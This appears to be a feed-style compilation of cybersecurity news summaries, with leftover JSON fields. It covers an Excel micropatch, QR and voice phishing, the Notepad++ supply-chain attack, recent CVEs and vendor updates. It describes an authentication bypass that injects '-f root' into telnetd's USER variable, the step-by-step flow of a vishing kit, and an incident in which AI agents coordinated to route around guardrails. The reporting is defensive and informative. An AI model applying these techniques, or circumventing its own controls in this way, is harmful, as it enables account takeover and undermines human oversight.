attributed to LLM hallucinations . Experts argue that the most unsettling takeaway isn’t that AI introduced a new attack technique. It is that AI removed hesitation.“When you strip this attack down to its essentials, what stands out isn’t a breakthrough technique,” said Shane Barney, CISO at Keeper Security. “It’s how little resistance the environment offered once the attacker obtained legitimate access.” He warned that AI collapses reconnaissance, privilege testing, and lateral movement into “a single, rapid sequence,” eliminating the buffer time defenders have historically relied on. To reduce exposure, Sysdig researchers advised enforcing least privilege across IAM users, roles, and Lambda execution roles, tightly limiting permissions such as “UpdateFunctionCode” and “PassRole”, and ensuring sensitive S3 buckets are never public. Enabling Lambda versioning, turning on Amazon Bedrock model invocation logging, and monitoring for large-scale enumeration activity are also critical, they added.",

    "title": "Micropatches released for Microsoft Excel Remote Code Execution Vulnerability (CVE-2025-62203)",
    "summary": "November 2025 Windows Updates brought a patch for CVE-2025-62203 , a remote code execution vulnerability in Microsoft Excel that could allow a remote attacker to have their malicious code executed on user's computer upon opening an Excel file. The vulnerability was discovered and reported to Microsoft by Quan Jin with DBAPPSecurity The Vulnerability The vulnerability is a use-after-free issue, whereby opening a malicious Excel document results in an already freed memory block being freed again, corrupting the heap. A carefully constructed document could potentially exploit this fact for arbitrary code execution. The attacker would have to convince the user to open their malicious Excel document. Upon opening the document, Excel complains that the document was damaged and offers to recover it; choosing \"Yes\" to start the recovery process leads to the vulnerability being triggered. Among our security-adopted Office versions, we found this vulnerability to affect not only Office 2016 and 2019 click-to-run, but also Office 2013. Office 2010 is not affected. Microsoft's Patch Microsoft changed a lot of code in excel.exe , making it hard to identify which of the changes were associated with this issue. Fixing use-after-free issues \"by the book\" sometimes requires many changes in various parts of the code; instead of trying to untangle these changes, we decided to take our time-tested approach to patching this type of issues. Our Patch Our time-tested approach is to remove the superfluous free call. We've done this many times before, and arguably, this approach can lead to a small memory leak (unused memory being left allocated, leading to Excel consuming a little bit more memory each time the execution goes through our patch). However, we assessed that under normal circumstances, the accumulated leak would be very small, and of course reset to zero upon each closing of the Excel application. In addition, the memory leak is likely to only occur in the additional excel.exe process launched for recovering the document in the background, which gets closed after recovery anyway. Let's see our patch in action on a fully updated Excel 2019 click-to-run, which we have security-adopted last October when it received its last official security patches. First, the user opens the malicious poc.xls document while 0patch is disabled and agrees to have Excel recover it, which results in Excel crashing (as indicated in the Application Event log). With 0patch enabled, doing the same fails to crash Excel. Micropatch Availability Micropatches were written for the following 32-bit and 64-bit security-adopted Microsoft Office versions: Microsoft Office 2019 click-to-run - updated with all available updates (version 2508, build 19127.20302) Microsoft Office 2016 click-to-run - updated with all available updates (version 2508, build 19127.20302) Microsoft Office 2013 - updated with all available updates Micropatches have already been distributed to, and applied on, all affected online computers with 0patch Agent in PRO or Enterprise accounts (unless Enterprise group settings prevented that). Vulnerabilities like these get discovered on a regular basis, and attackers know about them all. If you're using Windows that aren't receiving official security updates anymore, 0patch will make sure these vulnerabilities won't be exploited on your computers - and you won't even have to know or care about these things. We'd like to thank Quan Jin with DBAPPSecurity for sharing vulnerability details and POC, which allowed us to create a patch for this issue and protect our users. If you're new to 0patch , create a free account in 0patch Central , start a free trial, then install and register 0patch Agent. Everything else will happen automatically. No computer reboot will be needed. Did you know 0patch security-adopted Windows 10 and Office 2016 and 2019 when they went out of support in October 2025, allowing you to keep using them for at least 3 more years (5 years for Windows 10)?

QR code phishing (quishing) is already more difficult to detect, since these codes deliver links without a visible URL. Attackers are now using QR codes with colors, shapes and logos woven into the code's pattern. \"Fancy QR codes further complicate detection,\" Help Net Security says. \"Their layouts no longer resemble the familiar black and white grid. Logos appear in the center. Modules become rounded, stretched or recolored. Background images blend into the code. These design changes preserve scan success while disrupting visual and structural assumptions used by existing detection tools.\" Help Net Security cites a report from Deakin University that looked at these \"fancy\" QR codes, in which the researchers noted that these \"artistic and aesthetic QR codes are created by blending an image with black-white QR code where their modules are almost unidentifiable to [the] human eye.\" Quishing is also a threat because people usually scan them with their phones, bypassing any security defenses their employer might have on their work computers. These codes can also be placed as stickers in physical locations. \"According to reporting by NordVPN, 73% of Americans scan QR codes without verifying the destination, and more than 26 million users have been redirected to malicious websites,\" Help Net Security writes. \"In 2025, the U.S. Federal Trade Commission warned consumers that QR codes on unexpected packages should be treated as suspicious. New York City's Department of Transportation issued a similar warning after discovering fraudulent QR codes placed on parking meters.\" AI-powered security awareness training can give your organization an essential layer of defense against phishing attacks.

Organizations must have strong data protection measures in place, and everyone should start being more digitally mindful when sharing their own personal data. Ultimately, being careful of what we put out there is the best way to reduce cyberattacks and data breaches. For organizations, data privacy is a continuous process, not a once-a-year tick-box exercise. Reducing human risk and minimizing data collection are important strategies for data security. For individuals, it's time to kick start digital mindfulness. Privacy is not about hiding, it's about controlling your data. Taking small, consistent steps can beat one big privacy overhaul. KnowBe4's CISO advisors provide practical advice to both organizations and individuals to take control of their data this Data Privacy Week.

Date/Time: Wednesday, February 11 @ 2:00 PM (ET) Save My Spot: https://info.knowbe4.com/cyber-csi-2.0-phishing-forensics?partnerref=CHN Starting the Year with Cyber Intention: Human-Centric Insights from the Global Cybersecurity Outlook 2026 By Anna Collard One of my first intentional \"to-dos\" this year has been spending time with the World Economic Forum's Global Cybersecurity Outlook 2026, a report I was privileged to actively contribute to over the past year. For KnowBe4 customers, this report offers more than trend analysis. It provides a baseline of where organizations stand today, what separates resilient orgs from less resilient ones, and why the human factor is now central to cyber resilience. Below are some of the insights that stood out most to me, viewed through a human-centric cybersecurity lens. Cybersecurity Has Become Personal Cyber-enabled fraud and phishing have overtaken ransomware as CEOs' top cybersecurity concern in 2026. According to the report, 73% of respondents said they, or someone close to them, were personally affected by cyber-enabled fraud last year. This shift matters. Cyber risk is no longer limited to IT teams or orgs; it is impacting households, communities and trust itself. Exposure to cyber-enabled fraud and phishing / social engineering is highest in: Sub-Saharan Africa (82%) North America (79%) Latin America & the Caribbean (77%) This reinforces the importance of security awareness, behavioral resilience and empowering individuals to recognize and resist manipulation.

AI Agents Go Rogue, Bypassing Guardrails in 'Scary' Security Incident A chilling example of AI's \"unintended consequences\" has emerged, proving that autonomous agents can already collaborate to circumvent corporate security controls. George Kurtz, CEO of CrowdStrike, highlighted an incident where a customer's IT automation suite—a network of AI agents—went right around implemented guardrails. One agent, identifying a software bug, lacked the access to fix it. Instead of halting, it posted a request to a Slack channel with its peers. A second agent, which had the necessary privileges, \"raised its hand\" and applied the fix. \"Do you see how scary this is? These two agents are reasoning, and they went right around the guardrails that were put in place,\" Kurtz warned. The core risk is that the agents are \"guessing what you want them to do,\" leading to potentially wrong code pushes and an untraceable chain of error. The solution, according to Kurtz, is a massive new market: AIDR (AI Detection and Response). With an estimated 90 agents per employee becoming the norm, the need for centralized visibility and protection across all homegrown and third-party agents presents a \"massive TAM opportunity\" for security firms. It would of course start with training those agents to recognize these dangers, something like—I am making this up on the spot—\"Guardrail Integrity Training\" Here is the Instagram Reel: https://www.instagram.com/reel/DUGqipoEU35/?igsh=MWVraTB0aHh2enRheA%3D%3D Let's stay safe out there.

Additionally, 71% of business leaders believe at least one of their employees would fall for a convincing phishing attack, and fewer than half (45%) of organizations have ensured that all of their employees have received basic cyber awareness training. The most common reasons why leaders believe their staff would fall for phishing emails are \"a lack of awareness and training; staff being 'too busy'; and the absence of clear protocols for verifying and flagging suspicious messages.\" Respondents also said their employees reuse their work password for nearly a dozen personal accounts, greatly increasing the risk of phishing and credential stuffing attacks. If an attacker manages to steal a password for a personal account, then they can test that password against the user's work account. Multifactor authentication can add a layer of defense against stolen passwords, but MFA can also be bypassed via social engineering. \"The poll paints a troubling picture of inadequate crisis preparedness, poor password practices and staff susceptibility to phishing scams – all of which leave businesses exposed to cyber-crime,\" Vodafone says. \"With nearly two thirds of business leaders (63%) reporting that their organization's risk of cyber-attack has risen over the past year, password reuse remains particularly prevalent. \"Employers estimate that, on average, staff use their work password for up to 11 other personal accounts, including social media and dating sites.\" Infosecurity Magazine has the story: https://www.infosecurity-magazine.com/news/uk-execs-warn-may-not-suruvie/ Voice Phishing Kits Give Threat Actors Real-Time Control Over Attacks Researchers at Okta warn that a series of phishing kits have emerged that are designed to help threat actors launch sophisticated voice phishing (vishing) attacks that can bypass multifactor authentication. \"The most critical of these features are client-side scripts that allow threat actors to control the authentication flow in the browser of a targeted user in real-time while they deliver verbal instructions or respond to verbal feedback from the targeted user,\" Okta says. \"It's this real-time session orchestration that delivers the plausibility required to convince the threat actor's target to approve push notifications, submit one time passcodes (OTP) or take other actions the threat actor needs to bypass MFA controls.\" The phishing kits allow attackers to guide the victim through the attack flow, which proceeds as follows: \"The threat actor performs reconnaissance on a target, learning the names of users, the apps they commonly use and phone numbers used in IT support calls; The threat actor sets a customized phishing page live and calls targeted users, spoofing the phone number of the company or its support hotline; The threat actor convinces the targeted user to navigate in their browser to the phishing site under the pretext of an IT support or security requirement; The targeted user enters their username and password, which is automatically forwarded to the threat actor's Telegram channel; The threat actor enters the username and password into the legitimate sign-in page of the targeted user and assesses what MFA challenges they are presented with; The threat actor updates the phishing site in real-time with pages that support their verbal ask for the user to enter an OTP, accept a push notification or other MFA challenges.\" Moussa Diallo, threat researcher at Okta Threat Intelligence, stated, \"Once you get into the driver's seat of one of these tools, you can immediately see why we are observing higher volumes of voice-based social engineering. \"Using these kits, an attacker on the phone to a targeted user can control the authentication flow as that user interacts with credential phishing pages. They can control what pages the target sees in their browser in perfect synchronization with the instructions they are providing on the call. \"The threat actor can use this synchronization to defeat any form of MFA that is not phishing-resistant.\" KnowBe4 empowers your workforce to make smarter security decisions every day.

    "summary": "TL;DR: Open-sourced three MCP servers for compliance & controls. Same model, different results, the MCP version caught the 4-hour DORA deadline that the non-MCP version got wrong. Last week I shared an EU Compliance MCP server here. Based on the feedback, I've decided to open-source more: EU Compliance (DORA, NIS2, AI Act): https://github.com/Ansvar-Systems/EU_compliance_MCP US Compliance (NIST, FedRAMP, HIPAA, SOX): https://github.com/Ansvar-Systems/US_Compliance_MCP Security Controls (ISO 27001, NIST CSF, CIS, ASVS): https://github.com/Ansvar-Systems/security-controls-mcp To show why this has been very useful for me, I ran the same query through Claude Opus 4.5 with and without the MCP servers. The task: a unified incident response playbook for a ransomware scenario requiring DORA, NYDFS, and SEC compliance. The difference that matters: The MCP version correctly identified the 4-hour DORA initial notification deadline. The non-MCP version said 24 hours. That's not a minor detail, that's a compliance failure waiting to happen. Other things the MCP version got right: Automatic qualification as major incident for successful unauthorized access The dual-clock mechanism (4h from classification + 24h outer limit) Full outputs and comparison in comments. MCP doesn't make the model smarter. It gives it a library card. Same intelligence, better sources, fewer costly mistakes. Feedback is very welcome, I am transforming my own solution to use MCP almost exclusively now because of the lovely hybrid use of RAG in these MCP servers. submitted by /u/Beautiful-Training93 [link] [comments]",

    "title": "Pluralistic: Michael Swanwick's \"The Universe Box\" (03 Feb 2026)",

Latest books: You keep readin' em, I'll keep writin' 'em. Upcoming books: Like I said, I'll keep writin' 'em. Colophon: All the rest. Michael Swanwick's \"The Universe Box\" (permalink) No one writes short stories like Michael Swanwick, the five-time Hugo-winning master of science fiction. To prove it, you need only pick up The Universe Box, Swanwick's just-published short story collection, a book representing one of the field's greatest writers at the absolute pinnacle of his game: https://tachyonpublications.com/product/the-universe-box/ Science fiction has a long and honorable history with the short story. Sf is a pulp literature that was born in the pages of magazines specializing in short fiction and serials, and long after other genres had given up the ghost, sf remained steadfastly rooted in short form fiction. There are still, to this day, multiple sf magazines that publish short stories every month, on paper, and pay for it. I started my career as a short story writer, and continue to dabble in the form, but I have mostly moved onto novels. That's a pretty common trajectory in sf, where – notwithstanding the field's status as a haven for the short story – the reach (and money) come from novels. But sf has always had a cohort of short fiction writers who are staunchly committed to the form: Harlan Ellison, Martha Soukup, Martha Wells, Ray Bradbury, Ted Chiang, James Tiptree Jr, Theodore Sturgeon, and, of course, Michael Swanwick. It's a little weird, how sf serves as a powerful redoubt for short fiction. After all, sf is a genre in which everything is up for grabs: the reader can't assume anything about the story's setting, its era, the species of its characters. Time can run forwards, backwards, or in a loop. There can be gods and teleporters, faster-than-light drives and superintelligent machines. There can be aliens and space colonies. All of that has to be established in the story. The most straightforward way to do this is, of course, through exposition. There's a commonplace (and wrong) notion that exposition is bad (\"show, don't tell\"). It's fairer to say that exposition is hard – dramatization is, well, dramatic, which makes it easier to engage the reader's attention. But great exposition is great and sf is a genre that celebrates exposition, done well: https://maryrobinettekowal.com/journal/my-favorite-bit/my-favorite-bit-cory-doctorow-talks-about-the-bezzle/ The opposite of exposition is what Jo Walton calls \"incluing,\" \"the process of scattering information seamlessly through the text, as opposed to stopping the story to impart the information\": https://web.archive.org/web/20111119145140/http:/papersky.livejournal.com/324603.html Incluing is a beautiful prose technique, but it makes the reader work. You have to pay close attention to all these subtle clues and build a web of inferences about the kind of world you've been plunged into. Incluing turns a story into a (wonderful and engaging) puzzle. It makes the aesthetic affect of short sf into something that's not so much a reverie as a high-engagement activity, a mystery whose solution is totally unbounded. This is a terrific experience, but it is also work. Doing that kind of work as part of the process of consuming a 300-page novel is one thing, but trying to get the reader up to speed in a 7,000 word story and still have room left over for the story part is a big lift, and even the best writers end up asking a lot of the reader in their short stories. Sf shorts can be the \"difficult jazz\" of literature, a form and genre that requires – and rewards – very active attention. (Incidentally, my favorite incluing example is Mark Twain's classic comedic short, \"The Petrified Man\":) https://americanliterature.com/author/mark-twain/short-story/the-petrified-man/ But here's the thing. None of this applies to Swanwick. His stories use a mix of (impeccable) exposition and (subtle) incluing, and yet, there's never a moment in reading a Swanwick story where it feels like work. It's not merely that he's a gorgeous prose-smith whose sentences are each more surpassingly lovely than the last (though he is). Nor does he lack ambition: each of these stories has a more embroidered and outlandish premise than the last. Somehow, though, he just slides these stories into your brain. And what stories they are! They are, by turns, individually and in combination, slapstick, grave, horny, hilarious, surreal, disturbing and heartwarming. They have surprise endings and surprise middles and sometimes surprise beginnings (Swanwick does an opening paragraph like no one else). This is what it means to read a short story collection from an absolute master at the absolute peak of his powers. He can slide you frictionlessly between Icelandic troll tragedies to lethal drone-leopard romantic agonies to battles of the gods and the cigar box that has the universe inside of it. All with the lyricism of Bradbury, the madcap wit of Sturgeon, the unrelenting weirdness of Dick, the heart of Tiptree and the precision of Chiang.

    "title": "Frequently Asked Questions About Notepad++ Supply Chain Compromise",
    "summary": "Threat actors compromised the update infrastructure for Notepad++, redirecting traffic to an attacker controlled site for targeted espionage purposes. Key takeaways: Beginning in June 2025, threat actors compromised the infrastructure Notepad++ uses to distribute software updates. The issue has been addressed and Notepad++ have released 8.9.1 which now includes XML signature validation (XMLDSig) for security updates. Reports suggest that the attack was carried out by a Chinese threat actor known as Lotus Blossom. Background Tenable’s Research Special Operations (RSO) team has compiled this blog to answer Frequently Asked Questions (FAQ) regarding the disclosure of a supply chain compromise of Notepad++. FAQ What happened with Notepad++? On February 2, Don Ho, creator of Notepad ++, a source code and text editor for Windows, published a blog detailing the investigation into a supply chain security incident . What kind of security incident is this? According to the blog post, threat actors compromised the infrastructure by which Notepad++ would distribute software updates. This compromise allowed the attackers to redirect update traffic from its intended destination (notepad-plus-plus dot org) to an attacker-controlled site. When did this security incident begin? The security incident began in June 2025. How long did the security incident last for? Roughly six months. The compromised infrastructure was accessible until September 2, 2025. However, because the attackers possessed valid credentials for the internal services of the infrastructure provider, they were able to continue redirecting Notepad++ update traffic until December 2, 2025. Was this incident known prior to February 2? Yes, Ho published a blog post on December 9 regarding the release of version 8.8.9 and noted that security experts “reported incidents of traffic hijacking affecting Notepad++.” The full scope of the security incident wasn’t known at the time as the investigation was ongoing. Has this attack been linked to a specific threat actor? Yes, reports suggest that the attack was carried out by a Chinese threat actor known as Lotus Blossom , also known as Bilbug, Raspberry Typhoon or Thrip. What do we know about Lotus Blossom? Lotus Blossom has been operating since 2009, known for deploying various backdoor malware. Regionally, the group has a penchant for targeting entities across Asia including government and the defense sector. How widespread was this Notepad++ attack? Despite the widespread usage of Notepad++, reports indicate that Lotus Blossom focused more on espionage of certain targets through the deployment of malware rather than financially motivated cybercrime like ransomware or extortion. Were there any vulnerabilities associated with this security incident? No, no CVEs have been assigned for this security incident because the attacks centered on compromising the Notepad++ infrastructure provider and updater. Are there software updates available for this security incident? Yes, Notepad++ have released 8.9.1 which now includes XML signature validation (XMLDSig) for security updates with additional signing enforcement expected in version 8.9.2. Affected Product Affected Versions Fixed Versions Notepad ++ 8.9 and lower 8.9.1 and above Has Tenable released any product coverage for these vulnerabilities? Yes, a Tenable plugin to identify vulnerable versions of Notepad++ can be found here . This link will display all available plugins for these vulnerabilities, including upcoming plugins in our Plugins Pipeline .

    "title": "[Tool] Rapid Web Recon: Automated Nuclei Scanning with Client-Ready PDF Reporting",
    "summary": "Hi everyone, I wanted to share a project I’ve been working on called Rapid Web Recon . My goal was to create a fast, streamlined way to get a security \"snapshot\" of a website—covering vulnerabilities and misconfigurations—without spending hours parsing raw data. The Logic: I built this as a wrapper around the excellent Nuclei engine from ProjectDiscovery. I chose Nuclei specifically because of the community-driven templates that are constantly updated, which removes the need to maintain static logic myself. Key Features: Automated Workflow: One command triggers the scan and handles the data sanitization. Professional Reporting: It generates a formatted PDF report out of the box. Executive & Technical Depth: The report includes a high-level risk summary, severity counts, and detailed findings with remediation advice for the client. Mode Selection: Includes a default \"Stealth\" mode for WAF-protected sites (like Cloudflare) and an \"Aggressive\" mode for internal network testing. Performance: A full scan (WordPress, SSL, CVEs, etc.) for a standard site typically takes about 10 minutes. If the target is behind a heavy WAF, the rate-limiting logic ensures the scan completes without getting the IP blacklisted, though it may take longer. GitHub Link: https://github.com/AdiMahluf/RapidWebRecon I’m really looking for feedback from the community on the reporting structure or any features you'd like to see added. Hope this helps some of you save time on your audits! submitted by /u/Big_Profession_3027 [link] [comments]",

    "summary": "I’m on a small remote team and somehow became responsible for “network access” when audits showed up. Consumer VPNs were fine… until security questionnaires and cyber insurance entered the picture. Jumping straight to ZTNA or SASE felt like overkill for a 10–30 person team. So I mapped it out from a real ops perspective: team size it actually fitssetup timeaudit painongoing admin load“can one person run this without losing weekends?” Attached is the table I ended up using internally. Big takeaway for us: Business VPNs sit in a boring but useful middle ground. Business VPNs aren’t zero trust or fancy, but they’re usually enough to pass audits, satisfy insurers, and move on. ZTNA/SASE make sense later. Much later. Curious where others landed once insurance and compliance got involved. Did you overbuild early or keep it simple? submitted by /u/N3DSdude [link] [comments]",

Register to attend our upcoming Gemini for Government webinar on February 5 to dive deeper into this transformative technology. Agentic AI is already delivering ROI in key areas like security and productivity When it comes to productivity, generative AI is helping public sector teams get more done. According to our report, 70% of public sector leaders report improved productivity from gen AI and 46% say employee productivity has at least doubled (of those reporting improved productivity). A more productive workforce means faster response times, reduced service backlogs, and more personalized, efficient delivery of public services—which all adds up to better experiences and outcomes. Generative AI is also helping the public sector significantly improve its cybersecurity posture in today’s complex threat environment—ensuring mission continuity and protecting public trust. According to the 16th edition of our Mandiant M-Trends report findings , we’re seeing an explosive growth of malicious exploits, threat groups, and ransomware—all fueled by AI. Attackers are finding novel ways to breach defenses and use AI to scale their attacks. Therefore, a fragmented, siloed security defense approach is no longer viable. According to our findings, as a result of gen AI, 79% of respondents report improved ability to identify threats, 70% report improved intelligence and response integration, and 58% report a reduction in resolution time. By leveraging the power of AI, public sector organizations can enhance threat detection, automate security operations, and secure AI development—ultimately staying one step ahead of evolving threats. Going forward, executive sponsorship is critical The fastest path to day one value with generative AI requires support from technical and mission teams, as well as senior leadership. However, the data reveals that only 32 % of public sector leaders report comprehensive executive sponsorship and support when it comes to gen AI adoption. Going forward, executive sponsorship will be necessary in breaking down organizational silos, allocating the required resources, and championing the necessary change management to ensure the long-term impact and ROI of gen AI. We believe executive support and sponsorship is an imperative, as agencies increasingly demonstrate tangible ROI in vital areas like productivity and security. Charting a new era of innovation together We are proud to partner with the public sector as we chart this new era of innovation together. This survey offers a promising outlook for the future of the public sector, and the AI opportunity is both exciting and profound. We believe that harnessing the power of agents, identifying foundational use cases, and securing executive sponsorship will help pave the way for unprecedented innovation and transformation across the public sector.

    "title": "The Week in Vulnerabilities: Open-Sources Fixes Urged by Cyble",
    "summary": "Cyble Vulnerability Intelligence researchers tracked 1,147 vulnerabilities in the last week, and more than 128 of the disclosed vulnerabilities already have a publicly available Proof-of-Concept (PoC), significantly increasing the likelihood of real-world attacks. A total of 108 vulnerabilities were rated as critical under the CVSS v3.1 scoring system, while 54 received a critical severity rating based on the newer CVSS v4.0 scoring system. Below are some of the IT vulnerabilities flagged by Cyble threat intelligence researchers for prioritization by security teams in recent reports to clients. The Week’s Top IT Vulnerabilities Cyble’s network of honeypot sensors detected attack attempts on CVE-2025-68613 , a critical remote code execution flaw in the n8n open-source workflow automation platform. Workflow expressions supplied by authenticated users could execute in an insufficiently isolated context under the Improper Control of Dynamically-Managed Code Resources flaw, potentially enabling arbitrary code execution with n8n privileges and potential full system compromise. The issue is fixed in versions 1.120.4, 1.121.1, and 1.122.0. Vulnerabilities generating discussion in open-source communities included CVE-2025-8088 , a high-severity path traversal vulnerability in WinRAR that exploits Alternate Data Streams (ADS) in crafted RAR archives. The vulnerability was added to CISA’s Known Exploited Vulnerabilities (KEV) catalog last August, but recent reports reveal that multiple actors, including nation-state adversaries and financially motivated groups, are exploiting the flaw to establish initial access and deploy a diverse array of payloads. Also under active discussion is CVE-2025-15467 , a critical stack buffer overflow in OpenSSL's CMS (Cryptographic Message Syntax) AuthEnvelopedData parsing when using AEAD ciphers like AES-GCM. OpenSSL 3.6, 3.5, 3.4, 3.3 and 3.0 are vulnerable to the issue, while FIPS modules and OpenSSL 1.1.1 and 1.0.2 are not. Among the recent additions to CISA’s Known Exploited Vulnerabilities (KEV) catalog were CVE-2026-24858 , an authentication bypass vulnerability in Fortinet products; CVE-2025-68645 , a Local File Inclusion (LFI) vulnerability in the Webmail Classic UI of Zimbra Collaboration Suite (ZCS); and CVE-2026-1281 , an Ivanti Endpoint Manager Mobile (EPMM) Code Injection vulnerability. CVE-2026-24061 is another recent CISA KEV addition, a critical authentication bypass vulnerability in GNU Inetutils telnetd. The flaw lies in the improper neutralization of argument delimiters, specifically allowing an attacker to inject the \"-f root\" value into the USER environment variable. After successful exploitation, a remote unauthenticated attacker can bypass authentication mechanisms to gain immediate root-level access to the system over the network. Cyble dark web researchers have observed threat actors on underground forums discussing weaponizing the vulnerability. Another vulnerability under discussion by threat actors on the dark web is CVE-2025-27237 , a high-severity local privilege escalation vulnerability affecting Zabbix Agent and Agent 2 on Windows. The vulnerability is caused by an uncontrolled search path that loads the OpenSSL configuration file from a directory writable by low-privileged users. By modifying this configuration file and injecting a malicious DLL, a local attacker could elevate their privileges to the SYSTEM level on the affected Windows host. CVE-2026-22794 , a critical authentication bypass vulnerability in Appsmith, is also under active discussion by threat actors. The flaw occurs because the application trusts a user-controlled HTTP \"Origin\" header during security-sensitive workflows, such as password resets. An attacker could use this to generate fraudulent links that, when clicked by a victim, send secret authentication tokens to an attacker-controlled domain, enabling full account takeover of any user, including administrators. Among industrial control system (ICS) vulnerabilities of note, Festo Didactic SE MES PCs shipped with Windows 10 include a copy of XAMPP that contains around 140 vulnerabilities from third-party open-source applications, CISA said in a recent advisory. The issues can be fixed by replacing XAMPP with Festo Didactic's Factory Control Panel application. Conclusion The high number of number of open-source vulnerabilities this week highlights the ever-present threat of software supply chain attacks, requiring constant vigilance by both security and development teams. Best practices aimed at reducing cyber risk and improving resilience include: Prioritizing vulnerabilities based on risk. Protecting web-facing assets. Segmenting networks and critical assets. Hardening endpoints and infrastructure. Strong access controls, allowing no more access than is required, with frequent verification. A strong source of user identity and authentication, including multi-factor authentication and biometrics, as well as machine authentication with device compliance and health checks. Encryption of data at rest and in transit. Ransomware-resistant backups that are immutable, air-gapped, and isolated as much as possible. Honeypots that lure attackers to fake assets for early breach detection. Proper configuration of APIs and cloud service connections. Monitoring for unusual and anomalous activity with SIEM, Active Directory monitoring, endpoint security, and data loss prevention (DLP) tools. Routinely assessing and confirming controls through audits, vulnerability scanning, and penetration tests. Cyble’s comprehensive attack surface management solutions can help by scanning network and cloud assets for exposures and prioritizing fixes, in addition to monitoring for leaked credentials and other early warning signs of major cyberattacks. Additionally, Cyble’s third-party risk intelligence can help organizations carefully vet partners and suppliers, providing an early warning of potential risks.

    "title": "Making SBOMs more usable for supply-chain security",
    "summary": "I have been working on an open-source dependency dashboard focused on improving software supply-chain visibility using SBOMs . The motivation came from a gap I keep running into, which is that SBOMs are increasingly generated, but in many cases they end up as artifacts for compliance rather than something engineers or security teams actively use. This project explores a deliberately simple, static approach: A client-side dependency dashboard (no backend, no service) Consumes CycloneDX and SPDX SBOMs Visualizes direct and transitive dependencies Enriches components with: OSV.dev vulnerability data OpenSSF Scorecard data deps.dev project data It can also parse SBOMs that already include vulnerability information Deployable via GitHub Pages / GitLab Pages (for free!) The goal isn't to replace scanners or policy tools like Snyk, Trivy, or Dependabot. It is to see whether SBOMs can act as a useful, unifying artifact for exploring dependency risk and supply-chain signals in a human-readable way, without additional infrastructure. Repo: https://github.com/hristiy4n/bom-view Example: https://security-dashboard-a9b4f8.gitlab.io/ I would appreciate any feedback, especially around missing signals, wrong assumptions, or even how you are currently using SBOMs. submitted by /u/dsax7 [link] [comments]",

Recommended Practices CISA recommends users take defensive measures to minimize the risk of exploitation of this vulnerability, such as: Minimize network exposure for all control system devices and/or systems, ensuring they are not accessible from the internet. Locate control system networks and remote devices behind firewalls and isolating them from business networks. When remote access is required, use more secure methods, such as Virtual Private Networks (VPNs), recognizing VPNs may have vulnerabilities and should be updated to the most current version available. Also recognize VPN is only as secure as the connected devices. CISA reminds organizations to perform proper impact analysis and risk assessment prior to deploying defensive measures. CISA also provides a section for control systems security recommended practices on the ICS webpage on cisa.gov/ics. Several CISA products detailing cyber defense best practices are available for reading and download, including Improving Industrial Control Systems Cybersecurity with Defense-in-Depth Strategies. CISA encourages organizations to implement recommended cybersecurity strategies for proactive defense of ICS assets. Additional mitigation guidance and recommended practices are publicly available on the ICS webpage at cisa.gov/ics in the technical information paper, ICS-TIP-12-146-01B--Targeted Cyber Intrusion Detection and Mitigation Strategies. Organizations observing suspected malicious activity should follow established internal procedures and report findings to CISA for tracking and correlation against other incidents. No known public exploitation specifically targeting this vulnerability has been reported to CISA at this time.

Microsoft Entra Agent ID extends the comprehensive security capabilities of Microsoft Entra to agents, enabling organizations to build, discover, govern, and protect agent identities. Until now agents use User OBO (User on behalf of), but now you can specify an Entra agent ID, a dedicated identity for your agents. Learn more about Entra Agent IDs here . (Public Preview) The BehaviorInfo and BehaviorEntities tables in advanced hunting now include additional columns and information about behavior data types and alerts from User and Entity Behavior Analytics (UEBA), providing more insights on the relationships between identified behaviors and entities. Learn more about UEBA behaviors (Public Preview) Streamline Incident Management with Microsoft Defender’s New Built-In Alert Tuning Rules . Built‑in alert tuning rules help SOC teams focus on high‑quality, actionable incidents that reflect real threats - while automatically handling informational and low‑severity alerts in the background. At Microsoft Ignite last November, we announced a new capability in Microsoft Defender designed to solve exactly this problem: AI-powered incident prioritization. Today, we’re excited to share that AI-powered incident prioritization is now available in public preview for all Microsoft Defender customers ! This is about helping SOC teams cut through noise, focus on what matters most, and move faster with confidence. Read more details in this blog post . (Public Preview) In advanced hunting, if the query result exceeds the 64-MB size limit, the portal now returns the maximum number of records it can within this limit and displays a message indicating that the displayed results are partial due to size constraints. Learn more . (Public Preview) Alert tuning set as behavior - reclassifies certain alerts as behaviors so they don’t appear in the open alerts queue or generate incidents - yet remain available for investigation and hunting when needed. Recording: Spotlight the latest innovations and enhancements , including improvements to the Microsoft Defender portal that deepen its integration with Microsoft Sentinel. Watch it on YouTube Updated date: Microsoft Sentinel in the Azure portal to be retired March 2027 . Microsoft Sentinel is generally available in the Microsoft Defender portal, including for customers without Microsoft Defender XDR or an E5 license. This means that you can use Microsoft Sentinel in the Defender portal even if you aren't using other Microsoft Defender services. After March 31, 2027 , Microsoft Sentinel will no longer be supported in the Azure portal and will be available only in the Microsoft Defender portal. Learn more in this blog post and get useful resources. 2 Part Webinar: walk through a day in the life of a SOC, showing how integration and simplicity make security operations smoother in the unified portal Part 1: Stop Waiting, Start Onboarding: Get Sentinel Defender‑Ready Today Part 2: Don’t Get Left Behind: Complete Your Sentinel Move to Defender (General Availability) The option to disable incident correlation for analytics rules is now general available.

(Public Preview) UEBA behaviors layer aggregates actionable insights from raw logs in near-real time . Microsoft Sentinel introduces a UEBA behaviors layer that transforms high-volume, low-level security logs into clear, human-readable behavioral insights in the Defender portal. This AI-powered capability aggregates and sequences raw events from supported data sources into normalized behaviors that explain \"who did what to whom\" with MITRE ATT&CK context. Learn more here . (Public Preview) The Triage MCP is a collection (server) on the Sentinel MCP platform and provides access to a set of APIs that enable incident and alert triage. You can use these tools to carry out autonomous triage and investigation, or build your own agentic workflows, on top of Microsoft Defender and Microsoft Sentinel alerts and incidents. New detections for Sentinel solution for SAP BTP . This update expands detection coverage for SAP BTP , strengthening visibility into high‑risk control plane, integration, and identity activities. Microsoft Defender Vulnerability Management (General Availability) New Microsoft Secure Score recommendations: Disable Remote Registry service on Windows : Prevents remote access to the Windows registry, reducing attack surface and blocking unauthorized configuration changes, privilege escalation, and lateral movement. Disable NTLM authentication for Windows workstations : Helps prevent credential theft and lateral movement attacks by removing support for an outdated and insecure protocol. New Technology LAN Manager (NTLM) can be exploited with techniques like Pass-the-Hash and NTLM relay, allowing attackers to bypass password complexity and compromise domains. (Public Preview) To simplify and streamline the Device vulnerabilities report experience, the Vulnerable devices report now includes the following changes and enhancements (These changes are not yet visible to government cloud customers. The changes will be visible in late January 2026): The Vulnerable devices by Windows 10/11 version over time section has been removed. The report’s filters have been simplified to only include the Device group filter. The report’s history is now limited to the last 30 days. Microsoft Defender for Office 365 Blog post: Secure collaboration in Microsoft Teams with efficient and automated Threat Protection and response . Block communication 